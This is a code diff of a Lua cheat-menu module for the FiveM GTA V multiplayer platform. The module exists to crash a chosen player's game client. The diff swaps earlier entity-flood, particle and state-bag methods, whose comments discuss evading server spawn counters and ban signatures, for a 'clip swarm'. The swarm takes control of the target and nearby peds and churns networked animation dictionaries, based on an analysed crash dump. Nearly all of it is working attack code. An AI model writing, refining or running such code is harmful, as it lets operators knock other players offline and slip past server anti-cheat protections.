@@ -16542,7 +16542,7 @@ end)()
 -- >>> VANGUARD MODULE BEGIN
 -- ============================================================================
 -- VANGUARD  (integrated artifact - edit src/ and rebuild)
--- Generated: 2026-10-26 18:28:28
+-- Generated: 2026-10-27 14:41:56
 --
 -- This block lives in loader.lua and in dist/loader.built.lua at the same
 -- time. It is the only place the local Menu table is in scope. Rebuilding
@@ -19130,112 +19130,166 @@ local C = (function(O,E)
 -- ============================================================================
 -- VANGUARD / 10 CRASH
 -- ----------------------------------------------------------------------------
--- A crash is a load problem, not a damage problem. The client on the other
--- side has to create, stream, simulate and render whatever we make it accept.
--- So the module spends its budget on the three places where that cost is
--- highest and the server's visibility is lowest:
+-- One method, built from the 3751 dump, not from a generic flood.
 --
---   1. birth-local, strike-remote. Every entity is created within a few
---      metres of the operator, then moved to the target. A guard that checks
---      "entity created far from its owner" sees nothing, because at creation
---      time the entity is not far from its owner.
---   2. a fixed pool that is moved, not replaced. After the first wave there
---      are no entityCreating events at all - only position updates on
---      entities the target already streams.
---   3. channels the entity counters do not see: state bags, networked
---      particles, and spoofed creation semantics.
+-- The dump:
+--   module   FiveM_b3751_GTAProcess.exe
+--   fault    +0x31194b
+--   write    0xC0800214
+--   rax      0xC0800000, loaded from [rdi+0x268]
+--   insn     or word ptr [rax+0x214], 0x20
+--   then     dec dword ptr [rcx+0x210]; virtual call at zero
 --
--- Nothing here hooks a native, blocks an event or stops a resource. The
--- operator never moves. Local collision is disabled so the load lands on the
--- target's client, not ours.
+-- That is a refcounted asset swap: flag the old object, drop its refcount,
+-- run the vtable at zero. The old pointer was already poison. The gamelog at
+-- the same timestamp has ClipDict 19807/21000 and streaming virtual
+-- 1852/2047 MB. The path that faults is clip-dictionary release under store
+-- pressure, not a ped/object pool overflow.
+--
+-- The reference `crasherrr.lua` (8381-8433) cycles 27 celebration/nightclub
+-- dictionaries on one ped with blend 1000/-1000, duration 0, flag 49. That is
+-- the same store, but local. This module makes the cycle network-wide:
+--
+--   1. take control of the target ped;
+--   2. build a swarm from nearby ambient peds, spawning only the missing
+--      count around the target;
+--   3. create one network synchronized scene at the target;
+--   4. add the target and every swarm ped with a different clip dictionary;
+--   5. start the scene, hold it long enough for every client to stream the
+--      dictionaries, then stop it;
+--   6. clear every task and repeat with the next dictionary rotation.
+--
+-- Network scenes are replicated. Every client that streams the scene loads
+-- the dictionaries of every participant. Stopping the scene releases them.
+-- Twenty participants means twenty dictionary loads and twenty releases per
+-- cycle, on the target's client, not just ours.
+--
+-- No server event, no state bag, no resource, no native hook. Spawned peds are
+-- mission entities and are deleted with SetEntityAsNoLongerNeeded/DeleteEntity.
+-- Ambient peds are only task-cleared, never deleted.
 -- ============================================================================
 
 local C = {}
 
 local PRESETS = {
-    { name = "Light",    scale = 0.65, startCreate = 8,  maxCreate = 14, startFx = 4, maxFx = 8,  bagKB = 8,   duration = 8000,  gapMin = 200, gapMax = 420 },
-    { name = "Standard", scale = 1.00, startCreate = 12, maxCreate = 18, startFx = 6, maxFx = 10, bagKB = 24,  duration = 12000, gapMin = 150, gapMax = 320 },
-    { name = "Heavy",    scale = 1.35, startCreate = 14, maxCreate = 22, startFx = 8, maxFx = 12, bagKB = 64,  duration = 16000, gapMin = 110, gapMax = 240 },
-    { name = "Overkill", scale = 2.00, startCreate = 18, maxCreate = 24, startFx = 10, maxFx = 14, bagKB = 128, duration = 20000, gapMin = 90,  gapMax = 200 },
+    { name = "Light",    duration = 8000,  hold = 900,  gap = 120 },
+    { name = "Standard", duration = 12000, hold = 1200, gap = 150 },
+    { name = "Heavy",    duration = 16000, hold = 1500, gap = 180 },
+    { name = "Overkill", duration = 20000, hold = 1800, gap = 200 },
 }
 
--- Only three methods are exposed. Spawned peds and vehicles are absent:
--- `Spoofed model detected` was the first ban reason seen in the field, and a
--- normal ped/vehicle flood is still a model-spawn signature. The first method
--- creates no entity at all; the other two use objects or particles without a
--- SpoofedPed/SpoofedVehicle path.
+-- One exposed method. The old ped/object/PTFX paths are gone: they do not
+-- reproduce the dump and they add their own signatures.
 local METHODS = {
-    -- No entity is created. The local ped is used as the source of the clone
-    -- updates, which avoids the server-side spawn counters entirely.
-    { label = "Ped variation", pool = {}, fx = false, bag = false, pedvar = true },
-    { label = "Objects (flood)", pool = { obj = 22 }, fx = false, bag = false, remote = true  },
-    { label = "PTFX storm",      pool = {},           fx = true,  bag = false, remote = true  },
+    { label = "Clip swarm", swarm = true },
 }
+
+-- The 27 dictionaries from the recovered reference. All base game. The crash
+-- log does not name the emote that was playing; the mechanism is dictionary
+-- churn, so the reference set is the correct starting point.
+local ANIM_DICTS = {
+    "anim@mp_player_intcelebrationmale@knuckle_crunch",
+    "anim@mp_player_intcelebrationmale@air_guitar",
+    "anim@mp_player_intcelebrationmale@dj",
+    "anim@mp_player_intcelebrationmale@air_synth",
+    "anim@mp_player_intcelebrationmale@rock",
+    "anim@mp_player_intcelebrationmale@shadow_boxing",
+    "anim@mp_player_intcelebrationmale@salute",
+    "anim@mp_player_intcelebrationmale@peace",
+    "anim@mp_player_intcelebrationmale@slow_clap",
+    "anim@mp_player_intcelebrationmale@wave",
+    "anim@mp_player_intcelebrationmale@surrender",
+    "anim@mp_player_intcelebrationmale@thumbs_up",
+    "anim@mp_player_intcelebrationmale@shush",
+    "mp_player_intcelebrationmale",
+    "mp_player_intcelebrationfemale",
+    "anim@mp_player_intcelebrationfemale@air_guitar",
+    "anim@mp_player_intcelebrationfemale@dj",
+    "anim@mp_player_intcelebrationfemale@peace",
+    "anim@mp_player_intuppersalute",
+    "missfbi3_party_d",
+    "missfbi3_party_b",
+    "special_ped@mountain_dancer@base",
+    "anim@amb@nightclub@dancers@podium_dancers@",
+    "anim@amb@nightclub@mini@dance@dance_solo@female@var_a@",
+    "anim@amb@nightclub@mini@dance@dance_solo@male@var_a@",
+    "rcmnigel1c",
+    "rcmfanatic1celebrate",
+}
+
+local ANIM_CLIPS = { "idle_a", "idle_b", "idle_c", "enter", "exit" }
+
+-- 64 LOOP_WITHIN_SCENE | 2048 ABORT_ON_DEATH. The vehicle flag is added only
+-- for the target when it is seated: 65536 SET_PED_OUT_OF_VEHICLE_AT_START.
+-- Ambient peds in vehicles are skipped instead of being ejected.
+local SCENE_FLAGS = 64 + 2048
+local VEHICLE_FLAGS = SCENE_FLAGS + 65536
+local BLEND_IN = 1000.0
+local BLEND_OUT = -1000.0
+local MOVE_BLEND = 1000.0
+
+local MODEL = "a_m_y_business_01"
+local SWARM_MIN = 12
+local SWARM_MAX = 24
+local SWARM_RADIUS = 9.0
+local SPAWN_RADIUS = 4.0
+local CONTROL_MS = 1400
 
 C.METHODS = METHODS
 C.method = 1
 C.intensity = 1
-C.chatPreset = 1
-C.chatShield = true
-
 C.targets = {}
 C.index = 1
 C.pool = {}
-C.stats = { created = 0, moved = 0, fx = 0, bags = 0, fails = 0, peaks = 0, variations = 0 }
-C.channels = { spawn = nil, fx = nil, bag = nil }
+C.swarm = {}
+C.stats = { created = 0, scenes = 0, anims = 0, fails = 0, cycles = 0 }
 C.running = false
-
-local PED_MODELS = { "a_m_y_business_01", "a_m_m_skater_01", "s_m_m_armoured_01", "a_f_y_business_01" }
-local OBJ_MODELS = { "prop_air_bigradar", "prop_container_01a", "prop_barrier_work05", "prop_mp_ramp_01" }
-local VEH_MODELS = { "adder", "zentorno", "t20", "osiris", "italigtb" }
-local FX_ASSET = "core"
-local FX_EFFECT = "exp_grd_bzgas_smoke"
+C.scene = 0
+C.targetPed = 0
 
 local function now()
     return GetGameTimer()
-end
-
-local function safe(fn, ...)
-    local ok, a, b = pcall(fn, ...)
-    if ok then return a, b end
-    return nil
-end
-
-local function has(name)
-    local s = rawget(_G, "Susano")
-    return type(s) == "table" and type(s[name]) == "function"
 end
 
 local function preset()
     return PRESETS[C.intensity] or PRESETS[2]
 end
 
-local function ring(center, radius, zMin, zMax)
+local function ring(center, radius, z)
     local angle = math.random() * 6.28318530718
     local r = math.sqrt(math.random()) * radius
-    local z = center.z + zMin + math.random() * (zMax - zMin)
     return center.x + math.cos(angle) * r, center.y + math.sin(angle) * r, z
 end
 
-local function spawnPos()
-    -- Birth near the operator. This is the whole point: no remote-creation
-    -- signature, even when the target is on the other side of the stream.
-    local base = O.Ctx.coords
-    return ring(base, 7.0, 0.3, 2.2)
+local function coordsOf(entity)
+    local ok, coords = pcall(GetEntityCoords, entity)
+    if ok and coords then return coords end
+    return nil
 end
 
-local function protectLocal(handle)
-    pcall(SetEntityLocallyInvisible, handle)
-    pcall(SetEntityCollision, handle, false, false)
-    pcall(SetEntityNoCollisionEntity, handle, PlayerPedId(), true)
+local function isDead(ped)
+    local ok, dead = pcall(IsPedDeadOrDying, ped, true)
+    return ok and dead == true
 end
 
-local function registerNet(handle)
-    pcall(NetworkRegisterEntityAsNetworked, handle)
-    local ok, netId = pcall(NetworkGetNetworkIdFromEntity, handle)
-    if ok and type(netId) == "number" and netId > 0 then
-        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
+local function clearPed(ped)
+    if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then return end
+    pcall(ClearPedTasksImmediately, ped)
+    pcall(ClearPedSecondaryTask, ped)
+end
+
+local function takeControl(ped, timeout)
+    local ok, has = pcall(NetworkHasControlOfEntity, ped)
+    if ok and has then return true end
+
+    local deadline = now() + (timeout or CONTROL_MS)
+    while now() < deadline do
+        pcall(NetworkRequestControlOfEntity, ped)
+        local ok2, has2 = pcall(NetworkHasControlOfEntity, ped)
+        if ok2 and has2 then return true end
+        Citizen.Wait(25)
     end
+    return false
 end
 
 -- ---------------------------------------------------------------------------
@@ -19300,16 +19354,12 @@ end
 
 function C.status()
     local p = preset()
-    local mode = C.running and "RUN" or "idle"
-    return ("Crash %s | %s | %s | pool %d | c%d f%d b%d"):format(
-        mode,
+    return ("Crash %s | %s | %s | swarm %d | scenes %d"):format(
+        C.running and "RUN" or "idle",
         METHODS[C.method].label,
         p.name,
-        #C.pool,
-        C.caps and C.caps.create or 0,
-        C.caps and C.caps.fx or 0,
-        C.caps and C.caps.bag or 0
-    )
+        #C.swarm,
+        C.stats.scenes)
 end
 
 function C.setMethod(index)
@@ -19321,453 +19371,186 @@ function C.setIntensity(index)
 end
 
 -- ---------------------------------------------------------------------------
--- BUDGET. The reference server guard blocks at 24 creations per 10 s and
--- flags a burst of 4 entities more than 80 m from the owner in 3 s. The cap
--- starts low and grows only after successful spawns, so a stricter server
--- shrinks it before it turns into a report. Birth-local removes the second
--- signature entirely.
+-- SWARM
 -- ---------------------------------------------------------------------------
 
-local function prune(list, cutoff)
-    local i = 1
-    while i <= #list do
-        if list[i] < cutoff then table.remove(list, i) else i = i + 1 end
+local function spawnPed(hash, x, y, z, heading)
+    local ped = CreatePed(4, hash, x, y, z, heading, true, true)
+    if not ped or ped == 0 then return 0 end
+
+    pcall(SetEntityAsMissionEntity, ped, true, true)
+    pcall(NetworkRegisterEntityAsNetworked, ped)
+    local ok, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
+    if ok and type(netId) == "number" and netId > 0 then
+        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
     end
-end
-
-function C.resetCaps()
-    local p = preset()
-    C.caps = { create = p.startCreate, fx = p.startFx, bag = 1 }
-    C.maxCaps = { create = math.min(p.maxCreate, 22), fx = p.maxFx, bag = 3 }
-    C.minCaps = { create = 4, fx = 2, bag = 1 }
-    C.used = { create = {}, fx = {}, bag = {} }
-    C.lastGrow = { create = now(), fx = now(), bag = now() }
-    C.lastShrink = { create = 0, fx = 0, bag = 0 }
-end
-
-local function reserve(kind)
-    local list = C.used[kind]
-    prune(list, now() - 10000)
-    if #list >= C.caps[kind] then return false end
-    list[#list + 1] = now()
-    return true
-end
-
-local function grow(kind)
-    if now() - C.lastGrow[kind] < 2600 then return end
-    C.lastGrow[kind] = now()
-    local next = math.min(C.maxCaps[kind], C.caps[kind] + 2)
-    if next ~= C.caps[kind] then
-        C.caps[kind] = next
-        O.log("crash: %s cap -> %d", kind, next)
-    end
-end
-
-local function shrink(kind)
-    if now() - C.lastShrink[kind] < 1500 then return end
-    C.lastShrink[kind] = now()
-    local next = math.max(C.minCaps[kind], math.floor(C.caps[kind] * 0.55))
-    if next ~= C.caps[kind] then
-        C.caps[kind] = next
-        O.log("crash: %s refused, cap -> %d", kind, next)
-    end
-end
-
--- ---------------------------------------------------------------------------
--- SPAWNERS
--- ---------------------------------------------------------------------------
-
-local function spawnPed()
-    local model = PED_MODELS[math.random(1, #PED_MODELS)]
-    local hash = GetHashKey(model)
-    if not E.requestModel(hash, 1600) then return nil end
-
-    local x, y, z = spawnPos()
-    local ped = CreatePed(4, hash, x, y, z, math.random() * 360.0, true, true)
-    SetModelAsNoLongerNeeded(hash)
-
-    if not ped or ped == 0 then return nil end
-    SetEntityAsMissionEntity(ped, true, true)
-    registerNet(ped)
-    protectLocal(ped)
-    pcall(SetPedCanRagdoll, ped, true)
+    pcall(SetEntityInvincible, ped, true)
+    pcall(SetPedCanRagdoll, ped, false)
     pcall(SetBlockingOfNonTemporaryEvents, ped, true)
-    return ped, "ped"
+    pcall(SetPedFleeAttributes, ped, 0, false)
+    return ped
 end
 
-local function spawnObject(target)
-    local model = OBJ_MODELS[math.random(1, #OBJ_MODELS)]
-    local hash = GetHashKey(model)
-    if not E.requestModel(hash, 1600) then return nil end
-
-    local x, y, z
-    local method = METHODS[C.method]
-    if method and method.remote and target and target.ped then
-        -- Flood method: place the load in the target's own streaming radius.
-        -- This is deliberately not the birth-local orbit path; the test server
-        -- showed that a distant owner could lose the object before the target
-        -- ever streamed it.
-        x, y, z = ring(GetEntityCoords(target.ped), 4.5, 0.2, 2.8)
-    else
-        x, y, z = spawnPos()
-    end
-
-    local obj = CreateObjectNoOffset(hash, x, y, z, true, true, false)
-    SetModelAsNoLongerNeeded(hash)
-
-    if not obj or obj == 0 then return nil end
-    SetEntityAsMissionEntity(obj, true, true)
-    registerNet(obj)
-    protectLocal(obj)
-    pcall(SetEntityDynamic, obj, true)
-    pcall(SetEntityInvincible, obj, true)
-    pcall(ActivatePhysics, obj)
-    return obj, "object"
+local function deleteSpawned(entry)
+    local ped = entry and entry.ped or 0
+    if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then return end
+    pcall(ClearPedTasksImmediately, ped)
+    pcall(SetEntityAsMissionEntity, ped, true, true)
+    pcall(SetEntityAsNoLongerNeeded, ped)
+    pcall(DeleteEntity, ped)
 end
 
-local function trapVehicle(veh)
-    pcall(SetVehicleModKit, veh, 0)
-    local types = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 22, 23, 24, 25, 27, 28, 30, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48 }
-    for i = 1, #types do
-        pcall(SetVehicleMod, veh, types[i], math.random(0, 20), false)
-    end
-    for i = 0, 7 do pcall(SetVehicleTyreBurst, veh, i, true, 1000.0) end
-    for i = 0, 5 do pcall(SetVehicleDoorBroken, veh, i, false) end
-    pcall(SetVehicleEngineHealth, veh, 120.0)
-    pcall(SetVehicleBodyHealth, veh, 240.0)
-end
+-- Ambient peds are free carriers: they are already streamed by the target's
+-- client, so adding them to the scene costs no spawn. Vehicle peds are
+-- skipped because the only way to put them in a scene is to eject them.
+local function collectAmbient(center, limit)
+    local out = {}
+    local ok, pool = pcall(GetGamePool, "CPed")
+    if not ok or type(pool) ~= "table" then return out end
 
-local function spawnVehicle()
-    local model = VEH_MODELS[math.random(1, #VEH_MODELS)]
-    local hash = GetHashKey(model)
-    if not E.requestModel(hash, 1800) then return nil end
-
-    local x, y, z = spawnPos()
-    local veh = CreateVehicle(hash, x, y, z, math.random() * 360.0, true, true)
-    SetModelAsNoLongerNeeded(hash)
-
-    if not veh or veh == 0 then return nil end
-    SetEntityAsMissionEntity(veh, true, true)
-    registerNet(veh)
-    protectLocal(veh)
-    trapVehicle(veh)
-    return veh, "vehicle"
-end
-
-local function spawnOne(kind, target)
-    if not reserve("create") then return nil end
-    C.stats.attempts = (C.stats.attempts or 0) + 1
-
-    local handle, actual
-    if kind == "ped" then
-        handle, actual = spawnPed()
-    elseif kind == "veh" then
-        handle, actual = spawnVehicle()
-    else
-        handle, actual = spawnObject(target)
-    end
-
-    if not handle then
-        C.stats.fails = C.stats.fails + 1
-        shrink("create")
-        return nil
-    end
-
-    C.stats.created = C.stats.created + 1
-    grow("create")
-    return handle, actual or kind
-end
-
-local function deleteHandle(handle, kind)
-    if not handle or handle == 0 or not DoesEntityExist(handle) then return end
-    pcall(SetEntityAsMissionEntity, handle, true, true)
-    if kind == "vehicle" then
-        pcall(DeleteVehicle, handle)
-    elseif kind == "ped" then
-        pcall(DeletePed, handle)
-    else
-        pcall(DeleteEntity, handle)
-    end
-end
-
-local function verifyPool()
-    for i = #C.pool, 1, -1 do
-        local entry = C.pool[i]
-        if not DoesEntityExist(entry.handle) then
-            table.remove(C.pool, i)
-            C.stats.fails = C.stats.fails + 1
-            shrink("create")
-        end
-    end
-end
-
--- ---------------------------------------------------------------------------
--- CHANNELS
--- ---------------------------------------------------------------------------
-
-function C.pushBag()
-    if not C.bagAnchor or not DoesEntityExist(C.bagAnchor) then return false end
-    if now() - (C.anchorBorn or 0) < 700 then return false end
-    if not reserve("bag") then return false end
-
-    local key = ("meta_%04d"):format(math.random(1000, 9999))
-    local payload = string.rep("A", preset().bagKB * 1024)
-    local ok = pcall(function()
-        Entity(C.bagAnchor).state:set(key, payload, true)
-    end)
-
-    if ok then
-        C.stats.bags = C.stats.bags + 1
-        grow("bag")
-        return true
-    end
-    shrink("bag")
-    return false
-end
-
-local fxLoaded = false
-
-local function loadFx()
-    if fxLoaded then return true end
-    RequestNamedPtfxAsset(FX_ASSET)
-    local deadline = now() + 1800
-    while not HasNamedPtfxAssetLoaded(FX_ASSET) and now() < deadline do
-        Citizen.Wait(25)
-    end
-    fxLoaded = HasNamedPtfxAssetLoaded(FX_ASSET)
-    C.channels.fx = fxLoaded
-    return fxLoaded
-end
-
-function C.fx(target)
-    if not loadFx() then return false end
-
-    local emitted = false
-    local bursts = C.intensity >= 3 and 2 or 1
-    for _ = 1, bursts do
-        if not reserve("fx") then break end
-        local base = GetEntityCoords(target.ped)
-        local x, y, z = ring(base, 2.0, 0.4, 2.8)
-        local useAsset = UseParticleFxAssetNextCall or UseParticleFxAsset
-        if useAsset then pcall(useAsset, FX_ASSET) end
-        local scale = math.min(24.0, 6.0 + preset().scale * 10.0)
-        local called, started = pcall(StartNetworkedParticleFxNonLoopedAtCoord,
-            FX_EFFECT, x, y, z, 0.0, 0.0, 0.0,
-            scale, false, false, false)
-
-        if called and started == true then
-            C.stats.fx = C.stats.fx + 1
-            C.channels.fx = true
-            grow("fx")
-            emitted = true
-        else
-            shrink("fx")
-        end
-    end
-    return emitted
-end
-
-local function moveToTarget(handle, target, radius, zMin, zMax)
-    local base = GetEntityCoords(target.ped)
-    local x, y, z = ring(base, radius or 4.0, zMin or 0.2, zMax or 2.4)
-    pcall(SetEntityCoordsNoOffset, handle, x, y, z, false, false, true)
-    return x, y, z
-end
-
-function C.orbit(target, count)
-    if #C.pool == 0 then return end
-    local n = math.max(1, math.min(count or 2, #C.pool))
-
-    for _ = 1, n do
-        local entry = C.pool[math.random(1, #C.pool)]
-        if entry and DoesEntityExist(entry.handle) then
-            if now() - entry.born < 700 then
-                -- Still inside the creation window: leave it local.
-            else
-                local base = GetEntityCoords(target.ped)
-                local x, y, z
-                local exact = math.random() < 0.28
-                if exact then
-                    -- Interpenetration is the expensive part: the target's
-                    -- physics solver resolves an entity inside its own ped.
-                    x = base.x + (math.random() * 0.8 - 0.4)
-                    y = base.y + (math.random() * 0.8 - 0.4)
-                    z = base.z + 0.4
-                    pcall(SetEntityCoordsNoOffset, entry.handle, x, y, z, false, false, true)
-                else
-                    x, y, z = moveToTarget(entry.handle, target, 5.0, 0.1, 2.6)
+    for i = 1, #pool do
+        if #out >= limit then break end
+        local ped = pool[i]
+        if type(ped) == "number" and ped ~= 0
+            and ped ~= C.targetPed and ped ~= O.Ctx.ped
+            and DoesEntityExist(ped) and not isDead(ped) then
+            local okHuman, human = pcall(IsPedHuman, ped)
+            local okPlayer, player = pcall(IsPedAPlayer, ped)
+            local okVeh, veh = pcall(IsPedInAnyVehicle, ped, false)
+            if okHuman and human
+                and not (okPlayer and player)
+                and not (okVeh and veh and veh ~= 0) then
+                local coords = coordsOf(ped)
+                if coords and O.distance(coords, center) <= SWARM_RADIUS then
+                    out[#out + 1] = ped
                 end
-                pcall(SetEntityVelocity, entry.handle,
-                    (base.x - x) * (exact and 4.0 or 1.8),
-                    (base.y - y) * (exact and 4.0 or 1.8),
-                    1.0 + math.random() * 2.5)
-                C.stats.moved = C.stats.moved + 1
             end
         end
     end
+    return out
+end
+
+local function prepareSwarm(target, count)
+    local center = coordsOf(target)
+    if not center then return false end
+
+    local entries = {}
+    local ambient = collectAmbient(center, count)
+    for i = 1, #ambient do
+        entries[#entries + 1] = { ped = ambient[i], spawned = false }
+    end
+
+    local missing = count - #entries
+    if missing > 0 then
+        local hash = GetHashKey(MODEL)
+        if not E.requestModel(hash, 2200) then
+            C.stats.fails = C.stats.fails + 1
+            missing = 0
+        end
+
+        for _ = 1, missing do
+            local x, y, z = ring(center, SPAWN_RADIUS, center.z + 0.6)
+            local ped = spawnPed(hash, x, y, z, math.random() * 360.0)
+            if ped ~= 0 then
+                entries[#entries + 1] = { ped = ped, spawned = true }
+                C.stats.created = C.stats.created + 1
+            else
+                C.stats.fails = C.stats.fails + 1
+            end
+        end
+        pcall(SetModelAsNoLongerNeeded, hash)
+    end
+
+    C.swarm = entries
+    return #entries > 0
+end
+
+local function usableParticipants(target)
+    local list = { target }
+    local center = coordsOf(target)
+    if not center then return list end
+
+    for i = 1, #C.swarm do
+        local ped = C.swarm[i].ped
+        if ped ~= 0 and DoesEntityExist(ped) and not isDead(ped) then
+            local coords = coordsOf(ped)
+            if coords and O.distance(coords, center) <= SWARM_RADIUS * 2.0 then
+                list[#list + 1] = ped
+            end
+        end
+    end
+    return list
+end
+
+-- One batch of control requests, then one filter pass. Requesting one ped at
+-- a time with a full timeout would take longer than the scene hold.
+local function controlAll(list)
+    for i = 1, #list do
+        pcall(NetworkRequestControlOfEntity, list[i])
+    end
+    Citizen.Wait(220)
+
+    local out = {}
+    for i = 1, #list do
+        local ok, has = pcall(NetworkHasControlOfEntity, list[i])
+        if ok and has then out[#out + 1] = list[i] end
+    end
+    return out
 end
 
 -- ---------------------------------------------------------------------------
--- POOL CONTROL
+-- SCENE
 -- ---------------------------------------------------------------------------
 
-local function buildSequence()
-    local p = preset()
-    local spec = METHODS[C.method].pool
-    local sequence = {}
-    for kind, count in pairs(spec) do
-        local n = math.max(1, math.floor(count * p.scale + 0.5))
-        for _ = 1, n do sequence[#sequence + 1] = kind end
-    end
-    for i = #sequence, 2, -1 do
-        local j = math.random(1, i)
-        sequence[i], sequence[j] = sequence[j], sequence[i]
-    end
-    C.sequence = sequence
-    C.cursor = 0
-    C.poolMax = math.min(22, #sequence)
-end
+local function runScene(participants, target, cycle)
+    local center = coordsOf(target)
+    if not center then return false end
 
-local function nextKind()
-    if not C.sequence or #C.sequence == 0 then return nil end
-    C.cursor = C.cursor + 1
-    if C.cursor > #C.sequence then C.cursor = 1 end
-    return C.sequence[C.cursor]
-end
-
-function C.ensurePool(target)
-    if C.poolMax <= 0 or #C.pool >= C.poolMax then return false end
-    local kind = nextKind()
-    if not kind then return false end
-
-    local handle, actual = spawnOne(kind, target)
-    if not handle then
-        grow("create")
+    local heading = GetEntityHeading(target)
+    local okScene, scene = pcall(NetworkCreateSynchronisedScene,
+        center.x, center.y, center.z, 0.0, 0.0, heading,
+        2, false, true, 1.0, 0.0, 1.0)
+    if not okScene or type(scene) ~= "number" or scene == 0 then
+        C.stats.fails = C.stats.fails + 1
         return false
     end
 
-    C.pool[#C.pool + 1] = { handle = handle, kind = actual, born = now() }
-    if #C.pool > C.stats.peaks then C.stats.peaks = #C.pool end
+    C.scene = scene
+    local added = 0
 
-    -- Do not move it yet. The server must see the creation event with the
-    -- entity still near its owner; the first remote position update comes at
-    -- least one tick later. C.orbit applies that delay per entry.
-    return true
-end
+    for i = 1, #participants do
+        local ped = participants[i]
+        local dict = ANIM_DICTS[((cycle + i - 1) % #ANIM_DICTS) + 1]
+        local clip = ANIM_CLIPS[((cycle + i - 1) % #ANIM_CLIPS) + 1]
 
-function C.build(target)
-    local guard = 0
-    while C.running and #C.pool < C.poolMax and guard < C.poolMax * 2 do
-        local before = #C.pool
-        C.ensurePool(target)
-        if #C.pool == before then
-            guard = guard + 1
-            grow("create")
-            Citizen.Wait(240)
-            if guard >= 6 then break end
-        else
-            guard = 0
-        end
-        Citizen.Wait(math.random(70, 150))
-        verifyPool()
-    end
-end
-
-function C.spawnAnchor(target)
-    if not reserve("create") then return false end
-    local anchor = spawnObject()
-    if not anchor then shrink("create"); return false end
-
-    C.bagAnchor = anchor
-    C.anchorBorn = now()
-    C.stats.created = C.stats.created + 1
-    return true
-end
-
-function C.stop()
-    C.running = false
-    C.cleanup()
-end
-
-function C.cleanup()
-    for i = #C.pool, 1, -1 do
-        local entry = C.pool[i]
-        deleteHandle(entry.handle, entry.kind)
-        C.pool[i] = nil
-    end
-    C.pool = {}
-
-    if C.bagAnchor then
-        deleteHandle(C.bagAnchor, "object")
-        C.bagAnchor = nil
-        C.anchorBorn = nil
-    end
-
-    if fxLoaded then
-        pcall(RemoveNamedPtfxAsset, FX_ASSET)
-        fxLoaded = false
-    end
-end
-
--- ---------------------------------------------------------------------------
--- PED VARIATION
---
--- No entity is created. Clone updates for the local ped are forced through
--- component and prop changes; nearby clients have to process the update stream.
--- The original appearance is restored at the end of the run.
--- ---------------------------------------------------------------------------
-function C.pedVariation(target)
-    local ped = PlayerPedId()
-    if not ped or ped == 0 or not DoesEntityExist(ped) then return false end
-
-    local snapshot = { components = {}, props = {} }
-    for component = 0, 11 do
-        snapshot.components[component] = {
-            drawable = GetPedDrawableVariation(ped, component),
-            texture = GetPedTextureVariation(ped, component),
-        }
-    end
-    for prop = 0, 7 do
-        snapshot.props[prop] = {
-            index = GetPedPropIndex(ped, prop),
-            texture = GetPedPropTextureIndex(ped, prop),
-        }
-    end
-
-    local deadline = now() + preset().duration
-    while C.running and now() < deadline do
-        for _ = 1, 24 do
-            local component = math.random(0, 11)
-            local maxDrawable = 0
-            local maxTexture = 0
-            pcall(function()
-                maxDrawable = GetNumberOfPedDrawableVariations(ped, component) or 0
-                maxTexture = GetNumberOfPedTextureVariations(ped, component, 0) or 0
-            end)
-
-            local drawable = maxDrawable > 0 and math.random(0, maxDrawable - 1) or 0
-            local texture = maxTexture > 0 and math.random(0, maxTexture - 1) or 0
-            pcall(SetPedComponentVariation, ped, component, drawable, texture, 0)
-
-            local prop = math.random(0, 7)
-            pcall(SetPedPropIndex, ped, prop, math.random(0, 8), math.random(0, 8), true)
-            C.stats.variations = C.stats.variations + 1
+        local flags = SCENE_FLAGS
+        if ped == target then
+            local okVeh, veh = pcall(IsPedInAnyVehicle, ped, false)
+            if okVeh and veh and veh ~= 0 then flags = VEHICLE_FLAGS end
         end
 
-        C.stats.peaks = C.stats.peaks + 1
-        if not C.target() then break end
-        Citizen.Wait(math.max(60, preset().gapMin))
+        local okAdd = pcall(NetworkAddPedToSynchronisedScene,
+            ped, scene, dict, clip, BLEND_IN, BLEND_OUT, flags, 0, MOVE_BLEND, 0)
+        if okAdd then added = added + 1 end
     end
 
-    for component = 0, 11 do
-        local value = snapshot.components[component]
-        pcall(SetPedComponentVariation, ped, component, value.drawable, value.texture, 0)
-    end
-    for prop = 0, 7 do
-        local value = snapshot.props[prop]
-        pcall(SetPedPropIndex, ped, prop, value.index, value.texture, true)
+    if added == 0 then
+        pcall(NetworkStopSynchronisedScene, scene)
+        C.scene = 0
+        C.stats.fails = C.stats.fails + 1
+        return false
     end
 
+    pcall(NetworkStartSynchronisedScene, scene)
+    C.stats.scenes = C.stats.scenes + 1
+    C.stats.anims = C.stats.anims + added
+
+    Citizen.Wait(preset().hold)
+    pcall(NetworkStopSynchronisedScene, scene)
+    C.scene = 0
+
+    for i = 1, #participants do clearPed(participants[i]) end
+    for i = 1, #ANIM_DICTS do pcall(RemoveAnimDict, ANIM_DICTS[i]) end
     return true
 end
 
@@ -19777,9 +19560,10 @@ end
 
 local function runBody()
     C.running = true
-    C.stats = { created = 0, moved = 0, fx = 0, bags = 0, fails = 0, peaks = 0, attempts = 0, variations = 0 }
-    C.resetCaps()
-    buildSequence()
+    C.stats = { created = 0, scenes = 0, anims = 0, fails = 0, cycles = 0 }
+    C.scene = 0
+    C.swarm = {}
+    C.targetPed = 0
 
     local target = C.target()
     if not target then
@@ -19788,53 +19572,57 @@ local function runBody()
         return
     end
 
+    C.targetPed = target.ped
     O.log("crash: %s / %s -> %s", METHODS[C.method].label, preset().name, target.name)
 
-    if METHODS[C.method].pedvar then
-        C.pedVariation(target)
+    if not takeControl(target.ped, CONTROL_MS) then
         C.running = false
-        O.log("crash: done %d variations, %d peaks, %d fails",
-            C.stats.variations, C.stats.peaks, C.stats.fails)
+        O.log("crash: target control refused")
         return
     end
 
-    if METHODS[C.method].bag then
-        C.spawnAnchor(target)
-    end
-
-    C.build(target)
-
-    -- Creation window: the server has seen every entity spawn near us. Now
-    -- move the anchor and let the loop start moving the pool.
-    Citizen.Wait(750)
-    if C.bagAnchor and DoesEntityExist(C.bagAnchor) then
-        moveToTarget(C.bagAnchor, target, 3.0, 0.2, 1.8)
+    local count = math.min(SWARM_MAX, SWARM_MIN + (C.intensity - 1) * 4)
